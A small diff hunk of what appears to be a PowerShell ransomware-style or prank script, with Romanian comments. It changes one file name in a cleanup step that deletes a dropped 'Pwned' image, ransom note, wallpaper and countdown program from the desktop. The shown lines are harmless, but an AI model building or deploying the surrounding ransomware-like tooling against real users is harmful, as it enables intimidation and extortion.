@@ -97,7 +97,7 @@ foreach ($file in $files1) {
 [Wallpaper]::SystemParametersInfo(20, 0, "$env:USERPROFILE\Desktop\Wallpaper.jpg" , 3)
 
 #Stergere fisierele descarcate
-Remove-Item -Path $env:USERPROFILE\Desktop\Pwned.jpg -Force
+Remove-Item -Path $env:USERPROFILE\Desktop\Pwned.png -Force
 Remove-Item -Path $env:USERPROFILE\Desktop\Wallpaper.jpg -Force
 Remove-Item -Path $env:USERPROFILE\Desktop\Ransom.txt -Force
 Remove-Item -Path $env:USERPROFILE\Desktop\Countdown.exe -Force
